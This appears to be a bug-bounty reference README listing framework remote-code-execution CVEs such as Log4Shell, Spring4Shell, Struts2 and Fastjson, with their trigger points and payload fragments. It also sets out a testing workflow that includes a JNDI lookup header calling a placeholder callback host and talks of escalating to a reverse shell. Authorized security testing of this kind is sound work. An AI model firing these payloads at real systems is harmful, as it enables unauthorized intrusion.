# Framework RCE Exploits (2026 reference)
> **Author:** MD MAHABUBUR RAHMAN

Modern frameworks ship classes/gadgets that convert untrusted input into code execution. The biggest bounties come from these **unauthenticated RCE** bugs.

## Priority framework vulns to test (2026)
| Bug | CVE | Where it triggers | Payload location |
|-----|-----|-------------------|------------------|
| **Log4Shell** | CVE-2021-44228 | any string logged by Log4j (headers, params, user agents, body) | `${jndi:...}` |
| **Log4j 2.16/2.17 bypass** | CVE-2021-45046 / 44832 | still common on patched-deprecated versions | `${jndi:ldap...}` variants |
| **Spring4Shell** | CVE-2022-22965 | Spring MVC + WAR + Tomcat/glassfish with JDK9+ | `class.module.classLoader` in multipart form |
| **Spring Cloud Function** | CVE-2022-22963 | header `spring.cloud.function.routing-expression` | `T(java.lang.Runtime)...` SpEL |
| **Apache Struts2** | CVE-2017-5638 (and newer) | multipart `Content-Type`, `redirect:` OGNL | OGNL expressions |
| **Fastjson** | CVE-2017-18349 etc. | JSON body with `@type` autoType | `{"@type":"..."}` |
| **WebLogic T3/IIOP** | CVE-2020-2555 etc. | IIOP/T3 deserialization + `wls9-async` path | serialized payload |
| **Jenkins CVE** | CVE-2024-23897 | `/cli` Groovy, `webapp` script | args |

## Files
- `log4j-spring4shell.txt` — the two hottest named CVEs with exact payloads
- `misc-java-rce.txt` — Struts, fastjson, weblogic, groovy, tomcat

## Golden workflow
1. Fingerprint the stack: headers (`Server: Apache-Coyote`, `X-Powered-By: SPRING`), error pages, `/actuator`, `Server: WebLogic`, `X-Application-Context`.
2. Fire the cheap detectors:
   - Log4Shell: header `User-Agent: ${jndi:ldap://COLLAB/1}` on every endpoint.
   - Spring4Shell: multipart with `class.module.classLoader...` + watch for changes / status different.
3. Confirm impact with OOB (DNS callback) BEFORE weaponizing a reverse shell.
4. Only escalate to RCE shell on authorized lab/scope.
